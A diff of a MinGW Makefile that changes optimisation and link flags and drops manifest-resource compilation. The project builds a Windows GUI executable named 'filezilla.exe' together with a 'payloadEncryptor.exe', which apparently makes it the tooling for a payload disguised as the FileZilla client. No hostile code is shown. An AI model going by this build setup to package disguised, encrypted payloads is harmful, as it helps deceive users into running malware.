@@ -3,8 +3,8 @@ CC = x86_64-w64-mingw32-gcc
 WINDRES = x86_64-w64-mingw32-windres
 
 # flags
-CFLAGS = -O5 -std=c99 -D_WINDOWS -D_MINGW_USE_STD_THREAD -fstack-protector -mwindows
-LDFLAGS = -Wl,--no-insert-timestamp -Wl,--dynamicbase -Wl,--nxcompat 
+CFLAGS = -O3 -std=c99 -D_WINDOWS -D_MINGW_USE_STD_THREAD -fstack-protector -mwindows -flto
+LDFLAGS = -Wl,--no-insert-timestamp -Wl,--dynamicbase -Wl,--nxcompat -flto
 
 # directories
 INC_DIR = ./inc
@@ -16,8 +16,7 @@ VER_DIR = ./ver
 RC_FILE = $(VER_DIR)/version.rc
 RES_FILE = $(OBJ_DIR)/version.res
 MANIFEST_FILE = $(VER_DIR)/app.manifest
-MANIFEST_RC = $(VER_DIR)/manifest.rc
-MANIFEST_RES = $(OBJ_DIR)/app_manifest.res
+
 OUT_FILE = filezilla.exe
 OUT_FILE_ENCRYPTOR = payloadEncryptor.exe
 
@@ -29,9 +28,9 @@ OBJ = $(patsubst $(SRC_DIR)/%.c,$(OBJ_DIR)/%.o,$(SRC))
 all: $(OUT_FILE) $(OUT_FILE_ENCRYPTOR)
 
 # link step
-$(OUT_FILE): $(OBJ) $(RES_FILE) $(MANIFEST_RES)
+$(OUT_FILE): $(OBJ) $(RES_FILE) 
 	@echo "Linking the executable with resources and manifest..."
-	$(CC) $(LDFLAGS) $(OBJ) $(RES_FILE) $(MANIFEST_RES) -o $@
+	$(CC) $(LDFLAGS) $(OBJ) $(RES_FILE)  -o $@ 
 	strip $(OUT_FILE)
 	
 
@@ -45,10 +44,6 @@ $(RES_FILE): $(RC_FILE) | $(OBJ_DIR)
 	@echo "Compiling version resources..."
 	$(WINDRES) $< -O coff -o $@
 
-# compile manifest resources
-$(MANIFEST_RES): $(MANIFEST_RC) | $(OBJ_DIR)
-	@echo "Compiling manifest resource..."
-	$(WINDRES) $< -O coff -o $@
 
 # ensure obj directory exists
 $(OBJ_DIR):
@@ -57,7 +52,7 @@ $(OBJ_DIR):
 # clean target
 clean:
 	@echo "Cleaning up old build artifacts..."
-	rm -f $(OUT_FILE) $(RES_FILE) $(MANIFEST_RES) $(OUT_FILE_ENCRYPTOR) $(OBJ_DIR)/*.o
+	rm -f $(OUT_FILE) $(RES_FILE) $(OUT_FILE_ENCRYPTOR) $(OBJ_DIR)/*.o
 
 # rebuild target
 rebuild: clean all
